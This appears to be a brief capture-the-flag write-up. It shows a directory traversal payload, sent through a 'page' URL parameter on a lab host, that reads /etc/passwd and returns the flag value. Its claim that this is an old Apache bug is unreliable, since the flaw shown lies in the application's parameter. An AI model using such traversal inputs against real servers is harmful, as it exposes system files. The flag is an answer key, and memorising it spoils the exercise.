# flag 8 | apache exploit

In old versions of apache, we can access the /etc/passwd due to a bug in the apache server. This bug is fixed in the latest version of apache.

If we try to access `http://192.168.56.104/?page=../../../../../etc/passwd` we get the following alert:

```
Still nope...
```

Then if we go to `http://192.168.56.104/?page=../../../../../../../../etc/passwd` we get the following alert:

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
```